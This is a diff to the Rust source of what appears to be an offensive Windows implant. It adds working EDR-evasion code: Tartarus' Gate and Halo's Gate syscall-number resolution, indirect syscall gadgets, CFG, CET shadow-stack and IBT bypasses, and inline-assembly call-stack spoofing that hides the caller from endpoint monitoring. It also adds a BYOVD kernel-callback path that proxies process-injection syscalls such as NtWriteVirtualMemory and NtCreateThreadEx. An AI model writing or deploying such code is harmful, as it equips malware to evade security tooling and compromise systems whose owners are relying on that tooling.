@@ -504,6 +504,36 @@ fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
         }
 
         // Hook detected (or parse failed on an unhooked stub).
+        //
+        // Try exception-based SSN resolution (Tartarus' Gate) first:
+        // walks the hook chain in memory and extracts the SSN from hooked
+        // Nt* function prologues without needing to fire an exception or
+        // read a clean ntdll.  Falls back to Halo's Gate + .text gadget
+        // scan on failure.
+        #[cfg(feature = "direct-syscalls")]
+        {
+            if is_hooked {
+                if let Some(ssn) = crate::exception_ssn::resolve_ssn_via_exception(func_name) {
+                    log::info!(
+                        "get_bootstrap_ssn: {func_name}: resolved SSN={} via exception-based (Tartarus' Gate)",
+                        ssn
+                    );
+                    // Locate a syscall;ret gadget in .text for the indirect call.
+                    let gadget_addr = scan_text_for_syscall_gadget(ntdll_base)
+                        .unwrap_or_else(|| {
+                            // Fallback: use the original func_addr — the syscall
+                            // gadget search is best-effort; the SSN is the critical part.
+                            func_addr
+                        });
+                    return Some(SyscallTarget { ssn, gadget_addr });
+                }
+                log::debug!(
+                    "get_bootstrap_ssn: {func_name}: exception-based SSN failed, \
+                     falling back to Halo's Gate"
+                );
+            }
+        }
+
         // Infer the SSN via Halo's Gate, then locate an unhooked
         // `syscall; ret` gadget in the loaded ntdll's .text section so the
         // returned gadget_addr is not inside an EDR-controlled trampoline.
@@ -2403,7 +2433,7 @@ pub unsafe fn bounded_transmute<D>(val: u64) -> D {
     std::mem::transmute_copy::<u64, D>(&val)
 }
 
-#[cfg(all(windows, feature = "cet-bypass"))]
+#[cfg(all(windows, feature = "cet-bypass", not(feature = "stack-spoof")))]
 #[macro_export]
 macro_rules! clean_call {
     ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
@@ -2420,13 +2450,18 @@ macro_rules! clean_call {
         let arg4 = args.get(3).copied().unwrap_or(0);
         let stack_args = if args.len() > 4 { &args[4..] } else { &[] };
 
+        // CFG bypass: promote the target address as a valid indirect call
+        // target before making the call.  No-op when cfg-bypass is disabled.
+        #[cfg(feature = "cfg-bypass")]
+        let _ = $crate::cfg_bypass::prepare_call(addr);
+
         // CET check: if CET bypass is enabled and CET is active, check
         // whether we should use the CET-compatible call-chain approach
         // instead of the standard spoof_call (which manipulates return
         // addresses and breaks shadow-stack integrity).
         let cet_action = $crate::cet_bypass::prepare_spoofing(None);
         if cet_action == $crate::cet_bypass::CetAction::UseCallChain {
-            // CET is active — use the kernel32 equivalent which maintains
+            // CET is active — prefer the kernel32 equivalent which maintains
             // shadow-stack integrity through legitimate call instructions.
             // Attempt to dispatch via the CET call-chain registry.
             if let Some(_result) = $crate::cet_bypass::call_via_chain($func_name, args) {
@@ -2437,16 +2472,44 @@ macro_rules! clean_call {
                 let _val: u64 = 0;
                 Ok(unsafe { $crate::syscalls::bounded_transmute(_val) })
             } else {
-                // No call chain registered for this function — fall through
-                // to the standard spoof_call path (will likely trigger a #CP
-                // exception, but the VEH handler may catch it).
+                // No call chain registered for this function.
+                // Attempt shadow stack forging via WRSS before falling back
+                // to raw spoof_call.  If WRSS is available, we forge the
+                // gadget address onto the shadow stack so the API's RET
+                // finds a matching entry and CET doesn't fire #CP.
                 let gadget = $crate::syscalls::find_jmp_rbx_gadget();
                 if gadget == 0 {
                     Err($crate::syscalls::SyscallError::NoGadgetAvailable)
                 } else {
+                    // Forge the shadow stack entry for the gadget address.
+                    // This is a no-op if CET-SS is not available.
+                    let _cookie = unsafe {
+                        $crate::shadow_stack_forge::prepare_spoofed_return(
+                            gadget, 0
+                        )
+                    };
                     unsafe { $crate::syscalls::set_spoof_ret(gadget) };
-                    let res = unsafe { $crate::syscalls::spoof_call(addr, gadget, arg1, arg2, arg3, arg4, stack_args) };
+                    // IBT bypass: if Indirect Branch Tracking is active,
+                    // dispatch through an ENDBR64; jmp rax gadget so the
+                    // indirect branch check passes.  Fall back to standard
+                    // spoof_call if IBT bypass is unavailable.
+                    let res = if $crate::ibt_bypass::is_ibt_bypass_available() {
+                        unsafe {
+                            $crate::ibt_bypass::ibt_safe_spoof_call(
+                                addr, gadget, arg1, arg2, arg3, arg4, stack_args,
+                            ).unwrap_or_else(|_| {
+                                $crate::syscalls::spoof_call(
+                                    addr, gadget, arg1, arg2, arg3, arg4, stack_args,
+                                )
+                            })
+                        }
+                    } else {
+                        unsafe { $crate::syscalls::spoof_call(addr, gadget, arg1, arg2, arg3, arg4, stack_args) }
+                    };
                     unsafe { $crate::syscalls::set_spoof_ret(0) };
+                    // Restore the shadow stack after the spoofed call.
+                    // If forging was performed, this undoes the modification.
+                    unsafe { $crate::shadow_stack_forge::restore_from_cookie(_cookie) };
                     Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
                 }
             }
@@ -2462,7 +2525,20 @@ macro_rules! clean_call {
                 // up as the spoofed return address.  This ensures the call stack
                 // seen by EDR returns into kernel32 rather than the agent .text.
                 unsafe { $crate::syscalls::set_spoof_ret(gadget) };
-                let res = unsafe { $crate::syscalls::spoof_call(addr, gadget, arg1, arg2, arg3, arg4, stack_args) };
+                // IBT bypass: route through ENDBR64 gadget when IBT is active.
+                let res = if $crate::ibt_bypass::is_ibt_bypass_available() {
+                    unsafe {
+                        $crate::ibt_bypass::ibt_safe_spoof_call(
+                            addr, gadget, arg1, arg2, arg3, arg4, stack_args,
+                        ).unwrap_or_else(|_| {
+                            $crate::syscalls::spoof_call(
+                                addr, gadget, arg1, arg2, arg3, arg4, stack_args,
+                            )
+                        })
+                    }
+                } else {
+                    unsafe { $crate::syscalls::spoof_call(addr, gadget, arg1, arg2, arg3, arg4, stack_args) }
+                };
                 // Clear the thread-local spoofed return address after the call.
                 unsafe { $crate::syscalls::set_spoof_ret(0) };
                 Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
@@ -2471,7 +2547,114 @@ macro_rules! clean_call {
     }};
 }
 
-#[cfg(all(windows, not(feature = "cet-bypass")))]
+/// `clean_call!` with CET bypass *and* multi-frame stack spoofing.
+///
+/// When both `cet-bypass` and `stack-spoof` are enabled, this variant
+/// prefers the synthetic call chain (which is CET-compatible since the
+/// return address is a legitimate `ret` gadget in a system DLL).
+/// It falls back to the CET call-chain registry, then to single-gadget
+/// spoof_call.
+#[cfg(all(windows, feature = "cet-bypass", feature = "stack-spoof"))]
+#[macro_export]
+macro_rules! clean_call {
+    ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
+        let addr = $crate::syscalls::get_clean_api_addr($dll_name, $func_name)
+            .unwrap_or_else(|e| {
+                log::error!("Failed to resolve clean {}: {}", $func_name, e);
+                return Err(anyhow::anyhow!("Failed to resolve clean {}: {}", $func_name, e));
+            });
+        let args: &[u64] = &[$($args as u64),*];
+        let arg1 = args.get(0).copied().unwrap_or(0);
+        let arg2 = args.get(1).copied().unwrap_or(0);
+        let arg3 = args.get(2).copied().unwrap_or(0);
+        let arg4 = args.get(3).copied().unwrap_or(0);
+        let stack_args = if args.len() > 4 { &args[4..] } else { &[] };
+
+        // CFG bypass: promote the target address as a valid indirect call
+        // target before making the call.  No-op when cfg-bypass is disabled.
+        #[cfg(feature = "cfg-bypass")]
+        let _ = $crate::cfg_bypass::prepare_call(addr);
+
+        // Prefer multi-frame synthetic call chain — CET-compatible because
+        // the return address is a legitimate `ret` inside a system DLL.
+        if let Some(chain) = $crate::stack_spoof::build_spoofed_stack() {
+            let res = unsafe {
+                $crate::syscalls::spoof_call_chain(
+                    addr, &chain, arg1, arg2, arg3, arg4, stack_args,
+                )
+            };
+            Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
+        } else {
+            // Fallback to existing CET-bypass logic.
+            let cet_action = $crate::cet_bypass::prepare_spoofing(None);
+            if cet_action == $crate::cet_bypass::CetAction::UseCallChain {
+                if let Some(_result) = $crate::cet_bypass::call_via_chain($func_name, args) {
+                    let _val: u64 = 0;
+                    Ok(unsafe { $crate::syscalls::bounded_transmute(_val) })
+                } else {
+                    // No call chain registered — attempt shadow stack forging
+                    // via WRSS before falling back to raw spoof_call.
+                    let gadget = $crate::syscalls::find_jmp_rbx_gadget();
+                    if gadget == 0 {
+                        Err($crate::syscalls::SyscallError::NoGadgetAvailable)
+                    } else {
+                        let _cookie = unsafe {
+                            $crate::shadow_stack_forge::prepare_spoofed_return(
+                                gadget, 0
+                            )
+                        };
+                        unsafe { $crate::syscalls::set_spoof_ret(gadget) };
+                        // IBT bypass: route through ENDBR64 gadget when IBT
+                        // is active for Indirect Branch Tracking compatibility.
+                        let res = if $crate::ibt_bypass::is_ibt_bypass_available() {
+                            unsafe {
+                                $crate::ibt_bypass::ibt_safe_spoof_call(
+                                    addr, gadget, arg1, arg2, arg3, arg4, stack_args,
+                                ).unwrap_or_else(|_| {
+                                    $crate::syscalls::spoof_call(
+                                        addr, gadget, arg1, arg2, arg3, arg4, stack_args,
+                                    )
+                                })
+                            }
+                        } else {
+                            unsafe { $crate::syscalls::spoof_call(addr, gadget, arg1, arg2, arg3, arg4, stack_args) }
+                        };
+                        unsafe { $crate::syscalls::set_spoof_ret(0) };
+                        unsafe { $crate::shadow_stack_forge::restore_from_cookie(_cookie) };
+                        Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
+                    }
+                }
+            } else if cet_action == $crate::cet_bypass::CetAction::Abort {
+                Err(anyhow::anyhow!("CET is active and cannot be bypassed for {}", $func_name))
+            } else {
+                let gadget = $crate::syscalls::find_jmp_rbx_gadget();
+                if gadget == 0 {
+                    Err($crate::syscalls::SyscallError::NoGadgetAvailable)
+                } else {
+                    unsafe { $crate::syscalls::set_spoof_ret(gadget) };
+                    // IBT bypass: route through ENDBR64 gadget when IBT is active.
+                    let res = if $crate::ibt_bypass::is_ibt_bypass_available() {
+                        unsafe {
+                            $crate::ibt_bypass::ibt_safe_spoof_call(
+                                addr, gadget, arg1, arg2, arg3, arg4, stack_args,
+                            ).unwrap_or_else(|_| {
+                                $crate::syscalls::spoof_call(
+                                    addr, gadget, arg1, arg2, arg3, arg4, stack_args,
+                                )
+                            })
+                        }
+                    } else {
+                        unsafe { $crate::syscalls::spoof_call(addr, gadget, arg1, arg2, arg3, arg4, stack_args) }
+                    };
+                    unsafe { $crate::syscalls::set_spoof_ret(0) };
+                    Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
+                }
+            }
+        }
+    }};
+}
+
+#[cfg(all(windows, not(feature = "cet-bypass"), not(feature = "stack-spoof")))]
 #[macro_export]
 macro_rules! clean_call {
     ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
@@ -2487,6 +2670,11 @@ macro_rules! clean_call {
         let arg3 = args.get(2).copied().unwrap_or(0);
         let arg4 = args.get(3).copied().unwrap_or(0);
         let stack_args = if args.len() > 4 { &args[4..] } else { &[] };
+
+        // CFG bypass: promote the target address as a valid indirect call
+        // target before making the call.  No-op when cfg-bypass is disabled.
+        #[cfg(feature = "cfg-bypass")]
+        let _ = $crate::cfg_bypass::prepare_call(addr);
 
         // Cross-reference: primary find_jmp_rbx_gadget call site is here.
         // See find_jmp_rbx_gadget near the bottom Windows helpers section.
@@ -2511,6 +2699,127 @@ macro_rules! clean_call {
             // cast result back
             Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
         }
+    }};
+}
+
+/// `clean_call!` with multi-frame stack spoofing via synthetic call chain.
+///
+/// When the `stack-spoof` feature is enabled, this variant first attempts
+/// to build a synthetic call chain via `stack_spoof::build_spoofed_stack()`.
+/// If a chain is available, `spoof_call_chain` is used — presenting a
+/// legitimate system-DLL function as the return address to EDR walkers.
+/// If no chain is available (e.g. gadget cache not yet populated), it
+/// falls back to the single-gadget `spoof_call`.
+#[cfg(all(windows, not(feature = "cet-bypass"), feature = "stack-spoof"))]
+#[macro_export]
+macro_rules! clean_call {
+    ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
+        let addr = $crate::syscalls::get_clean_api_addr($dll_name, $func_name)
+            .unwrap_or_else(|e| {
+                log::error!("Failed to resolve clean {}: {}", $func_name, e);
+                return Err(anyhow::anyhow!("Failed to resolve clean {}: {}", $func_name, e));
+            });
+        let args: &[u64] = &[$($args as u64),*];
+        let arg1 = args.get(0).copied().unwrap_or(0);
+        let arg2 = args.get(1).copied().unwrap_or(0);
+        let arg3 = args.get(2).copied().unwrap_or(0);
+        let arg4 = args.get(3).copied().unwrap_or(0);
+        let stack_args = if args.len() > 4 { &args[4..] } else { &[] };
+
+        // CFG bypass: promote the target address as a valid indirect call
+        // target before making the call.  No-op when cfg-bypass is disabled.
+        #[cfg(feature = "cfg-bypass")]
+        let _ = $crate::cfg_bypass::prepare_call(addr);
+
+        // Try the multi-frame synthetic call chain first.
+        if let Some(chain) = $crate::stack_spoof::build_spoofed_stack() {
+            let res = unsafe {
+                $crate::syscalls::spoof_call_chain(
+                    addr, &chain, arg1, arg2, arg3, arg4, stack_args,
+                )
+            };
+            Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
+        } else {
+            // Fallback: single-gadget spoof_call (jmp rbx gadget).
+            let gadget = $crate::syscalls::find_jmp_rbx_gadget();
+            if gadget == 0 {
+                Err($crate::syscalls::SyscallError::NoGadgetAvailable)
+            } else {
+                unsafe { $crate::syscalls::set_spoof_ret(gadget) };
+                let res = unsafe {
+                    $crate::syscalls::spoof_call(addr, gadget, arg1, arg2, arg3, arg4, stack_args)
+                };
+                unsafe { $crate::syscalls::set_spoof_ret(0) };
+                Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
+            }
+        }
+    }};
+}
+
+/// `trampoline_spoof!` — execute a Win32 API call through a trampoline-based
+/// synthetic call stack.
+///
+/// When the `trampoline-spoof` feature is enabled, this macro builds a
+/// multi-frame synthetic call chain using trampoline gadgets found in
+/// clean-mapped system DLLs, allocates a separate fake stack, and executes
+/// the API call through the chain.  The fake stack is freed after the call.
+///
+/// Falls back to `clean_call!` when the trampoline system is unavailable
+/// (e.g. gadget cache empty, allocation failure).
+///
+/// # Usage
+///
+/// ```rust,ignore
+/// let result = trampoline_spoof!("kernel32.dll", "VirtualAlloc", u64,
+///     0u64, 4096u64, 0x3000u64, 0x40u64);
+/// ```
+///
+/// # Arguments
+///
+/// * `$dll_name`  — DLL name (e.g. `"kernel32.dll"`)
+/// * `$func_name` — Export name (e.g. `"VirtualAlloc"`)
+/// * `$fn_type`   — Return type (must be ≤ 8 bytes)
+/// * `$args`      — Arguments (passed as `u64` to the target function)
+#[cfg(all(windows, feature = "trampoline-spoof", target_arch = "x86_64"))]
+#[macro_export]
+macro_rules! trampoline_spoof {
+    ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
+        let addr = match $crate::syscalls::get_clean_api_addr($dll_name, $func_name) {
+            Ok(a) => a,
+            Err(e) => {
+                log::error!("trampoline_spoof: failed to resolve {}: {}", $func_name, e);
+                return Err(anyhow::anyhow!("failed to resolve {}: {}", $func_name, e));
+            }
+        };
+        let args: &[u64] = &[$($args as u64),*];
+
+        // Try the trampoline path first.
+        if $crate::trampoline_spoof::is_available() {
+            match unsafe { $crate::trampoline_spoof::execute_via_trampoline(addr, args) } {
+                Ok(res) => {
+                    Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
+                }
+                Err(e) => {
+                    log::debug!("trampoline_spoof: trampoline execution failed ({}), falling back to clean_call", e);
+                    // Fall through to clean_call below.
+                    $crate::clean_call!($dll_name, $func_name, $fn_type $(, $args)*)
+                }
+            }
+        } else {
+            // Trampoline not available — fall back to clean_call.
+            $crate::clean_call!($dll_name, $func_name, $fn_type $(, $args)*
+            )
+        }
+    }};
+}
+
+/// Stub `trampoline_spoof!` when the feature is disabled — falls back to
+/// `clean_call!` unconditionally.
+#[cfg(all(windows, not(feature = "trampoline-spoof")))]
+#[macro_export]
+macro_rules! trampoline_spoof {
+    ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
+        $crate::clean_call!($dll_name, $func_name, $fn_type $(, $args)*)
     }};
 }
 
@@ -3707,6 +4016,129 @@ pub unsafe fn spoof_call(
     status
 }
 
+/// Multi-frame stack-spoofing indirect call with a synthetic call chain.
+///
+/// Enhanced version of `spoof_call` that uses a synthetic call chain to
+/// provide a better spoofed return address.  The return address seen by
+/// EDR stack walkers is a `ret` gadget inside a legitimate system DLL
+/// function (e.g. `kernelbase!CreateProcessW+0x55`) rather than a bare
+/// `jmp rbx` gadget in kernel32.
+///
+/// # How it works
+///
+/// Builds a two-entry fake frame chain on the stack:
+///   `[rsp]   = chain frame[0]  (ret gadget in legitimate function)`
+///   `[rsp+8] = continuation    (label 42 in spoof_call_chain)`
+///
+/// Execution trace:
+///   1. `jmp r11` → API target executes
+///   2. API `ret` → pops frame[0] → executes `ret` at that address
+///   3. frame[0]'s `ret` → pops continuation → back to cleanup code
+///
+/// EDR walkers see a legitimate function as the immediate caller with
+/// valid unwind metadata — significantly harder to detect than `jmp rbx`.
+///
+/// # Safety
+///
+/// Same safety requirements as `spoof_call`.  `chain` must contain at
+/// least one frame with a valid return address inside a loaded module
+/// with valid unwind metadata.
+#[cfg(all(windows, feature = "stack-spoof", target_arch = "x86_64"))]
+#[doc(hidden)]
+#[inline(never)]
+pub unsafe fn spoof_call_chain(
+    api_addr: usize,
+    chain: &crate::stack_spoof::SyntheticCallChain,
+    arg1: u64,
+    arg2: u64,
+    arg3: u64,
+    arg4: u64,
+    stack_args: &[u64],
+) -> u64 {
+    let status: u64;
+    let nstack = stack_args.len();
+    let stack_ptr = stack_args.as_ptr();
+
+    // Use the first chain frame's return address as the spoofed return site.
+    // This is a `ret` gadget inside a legitimate function body — much better
+    // than a bare `jmp rbx` gadget for EDR evasion.
+    let frame0_addr = chain
+        .frames
+        .first()
+        .map(|f| f.return_addr)
+        .unwrap_or(0);
+
+    std::arch::asm!(
+        "push rbx",
+        "push r14",
+        "push r15",
+
+        // Save RSP so we can restore it cleanly after the call.
+        "mov r14, rsp",
+
+        // Allocate shadow space (0x20) + stack args, 16-byte aligned.
+        "mov rax, {nstack}",
+        "shl rax, 3",
+        "add rax, 0x28 + 15",
+        "and rax, -16",
+        "sub rsp, rax",
+
+        // Copy stack arguments into [rsp + 0x28].
+        "test {nstack}, {nstack}",
+        "jz 41f",
+        "mov rcx, {nstack}",
+        "mov rsi, {stack_ptr}",
+        "lea rdi, [rsp + 0x28]",
+        "cld",
+        "rep movsq",
+
+        "41:",
+        // Load register arguments.
+        "mov rcx, {a1}",
+        "mov rdx, {a2}",
+        "mov r8,  {a3}",
+        "mov r9,  {a4}",
+
+        // Build the fake return chain:
+        //   [rsp]   = frame[0] (spoofed return — ret gadget in legit function)
+        //   [rsp+8] = continuation (label 42)
+        //
+        // API rets → frame[0] (ret gadget) → rets → continuation → cleanup
+        "lea r15, [rip + 42f]",
+        "push r15",
+        "mov r15, {chain_frame0}",
+        "push r15",
+
+        // Jump to the API target.
+        "mov r11, {api}",
+        "jmp r11",
+
+        // ── Continuation ──────────────────────────────────────────────
+        "42:",
+        "mov rsp, r14",
+        "pop r15",
+        "pop r14",
+        "pop rbx",
+
+        api           = in(reg) api_addr,
+        chain_frame0  = in(reg) frame0_addr,
+        nstack        = in(reg) nstack,
+        stack_ptr     = in(reg) stack_ptr,
+        a1            = in(reg) arg1,
+        a2            = in(reg) arg2,
+        a3            = in(reg) arg3,
+        a4            = in(reg) arg4,
+        lateout("rax") status,
+        out("rcx") _, out("rdx") _,
+        out("r8")  _, out("r9")  _, out("r10") _, out("r11") _,
+        out("r14") _, out("r15") _,
+        out("rsi") _, out("rdi") _,
+    );
+    status
+}
+
+
+
 #[cfg(all(windows, target_arch = "aarch64"))]
 #[doc(hidden)]
 #[inline(never)]
@@ -3809,6 +4241,65 @@ pub fn do_syscall_with_strategy(
             // handled consistently and unsupported ABIs fail in one place.
             do_syscall(target.ssn, target.gadget_addr, args)
         },
+        common::config::ExecStrategy::KernelProxy => {
+            // Proxy the syscall through a kernel-mode callback registered
+            // via BYOVD.  No user-mode syscall instruction is executed.
+            //
+            // Map the NT function name to a SyscallType enum, then submit
+            // the operation to the proxy dispatch queue.  The kernel callback
+            // executes the operation on our behalf.
+            #[cfg(all(windows, feature = "kernel-callback"))]
+            {
+                use crate::kernel_callback::proxy::{proxy_single, SyscallType};
+                let opcode = match func_name {
+                    "NtAllocateVirtualMemory" => SyscallType::NtAllocateVirtualMemory,
+                    "NtWriteVirtualMemory" => SyscallType::NtWriteVirtualMemory,
+                    "NtProtectVirtualMemory" => SyscallType::NtProtectVirtualMemory,
+                    "NtCreateThreadEx" => SyscallType::NtCreateThreadEx,
+                    "NtOpenProcess" => SyscallType::NtOpenProcess,
+                    "NtClose" => SyscallType::NtClose,
+                    "NtFreeVirtualMemory" => SyscallType::NtFreeVirtualMemory,
+                    "NtReadVirtualMemory" => SyscallType::NtReadVirtualMemory,
+                    "NtOpenThread" => SyscallType::NtOpenThread,
+                    "NtSuspendThread" => SyscallType::NtSuspendThread,
+                    "NtResumeThread" => SyscallType::NtResumeThread,
+                    "NtQueueApcThread" => SyscallType::NtQueueApcThread,
+                    "NtSetContextThread" => SyscallType::NtSetContextThread,
+                    "NtGetContextThread" => SyscallType::NtGetContextThread,
+                    other => {
+                        tracing::warn!(
+                            "kernel-proxy: unsupported syscall '{}', falling back to indirect",
+                            other
+                        );
+                        return unsafe {
+                            do_syscall(target.ssn, target.gadget_addr, args)
+                        };
+                    }
+                };
+                let mut proxy_args = [0u64; 6];
+                let copy_len = args.len().min(6);
+                proxy_args[..copy_len].copy_from_slice(&args[..copy_len]);
+                match proxy_single(opcode, proxy_args) {
+                    Ok(result) => result.status,
+                    Err(e) => {
+                        tracing::error!(
+                            "kernel-proxy: proxy_single failed for '{}': {}",
+                            func_name,
+                            e
+                        );
+                        -1
+                    }
+                }
+            }
+            #[cfg(not(all(windows, feature = "kernel-callback")))]
+            {
+                tracing::warn!(
+                    "kernel-proxy: KernelProxy strategy requested but kernel-callback \
+                     feature is not enabled; falling back to indirect"
+                );
+                unsafe { do_syscall(target.ssn, target.gadget_addr, args) }
+            }
+        }
         _ => unsafe {
             // Indirect syscall: locate a `syscall; ret` gadget in clean ntdll and
             // trampoline through it so that the call appears to originate there.
